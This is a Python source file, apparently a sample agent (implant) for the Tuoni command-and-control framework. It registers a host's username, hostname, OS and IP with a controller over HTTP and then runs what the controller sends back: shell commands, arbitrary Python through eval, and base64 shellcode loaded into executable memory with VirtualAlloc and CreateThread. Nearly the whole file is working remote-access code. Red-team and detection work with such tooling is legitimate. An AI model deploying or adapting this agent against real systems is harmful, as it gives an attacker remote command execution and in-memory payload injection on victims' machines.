#!/usr/bin/env python3
# /// script
# requires-python = ">=3.9"
# dependencies = ["requests>=2.28,<3"]
# ///
"""Python sample agent for the Tuoni external HTTP transport.

Polls the controller via HTTP POST, executes received commands, and returns
results on the next poll.

Usage:
    uv run agent.py <controller_host> <controller_port>
"""

import getpass
import platform
import socket
import struct
import subprocess
import sys
import time
import uuid

import requests


def detect_os():
    """Map the current platform to a Tuoni OS enum value."""
    name = platform.system().lower()
    if "windows" in name:
        return "WINDOWS"
    if "linux" in name:
        return "LINUX"
    if "darwin" in name:
        return "MAC"
    if "bsd" in name:
        return "BSD"
    return None


def detect_arch():
    """Return x64 or x86 based on the running Python interpreter."""
    return "x64" if struct.calcsize("P") * 8 == 64 else "x86"


def detect_ips():
    """Best-effort local IP address."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return None

def main():
    if len(sys.argv) != 3:
        print("Usage: %s <controller_host> <controller_port>" % sys.argv[0])
        sys.exit(1)

    server_url = "http://%s:%s/" % (sys.argv[1], sys.argv[2])
    agent_id = str(uuid.uuid4())
    sleep_interval = 2
    pending_result = None
    pending_success = True
    username = getpass.getuser()
    hostname = socket.gethostname()
    agent_os = detect_os()
    agent_arch = detect_arch()
    agent_ips = detect_ips()

    print("[agent] id=%s, polling %s every %ds" % (agent_id, server_url, sleep_interval))

    while True:
        try:
            data = {
                "id": agent_id,
                "type": "python",
                "username": username,
                "hostname": hostname,
                "os": agent_os,
                "processArch": agent_arch,
                "ips": agent_ips,
            }
            if pending_result is not None:
                data["result"] = pending_result
                data["success"] = pending_success

            try:
                r = requests.post(server_url, json=data, timeout=10)
                r.raise_for_status()
                response = r.json()
            except requests.RequestException as e:
                print("[agent] Connection failed: %s" % e)
                time.sleep(sleep_interval)
                continue

            pending_result = None
            pending_success = True
            if not response or "__type__" not in response:
                time.sleep(sleep_interval)
                continue

            cmd_type = response["__type__"]
            print("[agent] Received command: %s" % cmd_type)

            if cmd_type == "my_what":
                pending_result = "I'm a Python agent"

            elif cmd_type == "my_sleep":
                sleep_interval = int(response["sleep"])
                print("[agent] Sleep interval changed to %d" % sleep_interval)
                pending_result = "New sleep is %d" % sleep_interval

            elif cmd_type == "my_terminal":
                cmd = response["command"]
                print("[agent] Running: %s" % cmd)
                try:
                    r = subprocess.run(
                        cmd, shell=True, capture_output=True, timeout=30,
                    )
                    pending_result = (r.stdout + r.stderr).decode("utf-8", errors="replace")
                except subprocess.TimeoutExpired:
                    pending_result = "Command timed out after 30s"
                    pending_success = False

            elif cmd_type == "my_eval":
                pending_result = str(eval(response["code"]))

            elif cmd_type == "my_spawn":
                import base64
                import ctypes
                shellcode = base64.b64decode(response["shellcode"])
                k32 = ctypes.windll.kernel32
                k32.VirtualAlloc.restype = ctypes.c_void_p
                k32.CreateThread.restype = ctypes.c_void_p
                buf = k32.VirtualAlloc(
                    ctypes.c_void_p(0), len(shellcode), 0x3000, 0x40,
                )
                if not buf:
                    pending_result = "VirtualAlloc failed for %d bytes" % len(shellcode)
                    pending_success = False
                else:
                    ctypes.memmove(ctypes.c_void_p(buf), shellcode, len(shellcode))
                    k32.CreateThread(
                        ctypes.c_void_p(0), 0, ctypes.c_void_p(buf),
                        ctypes.c_void_p(0), 0, ctypes.c_void_p(0),
                    )
                    pending_result = "spawned thread for %d bytes shellcode" % len(shellcode)

            else:
                pending_result = "Unknown command type: %s" % cmd_type

        except Exception as e:
            print("[agent] Error: %s" % e)
            if pending_result is None:
                pending_result = str(e)
                pending_success = False

        time.sleep(sleep_interval)


if __name__ == "__main__":
    main()
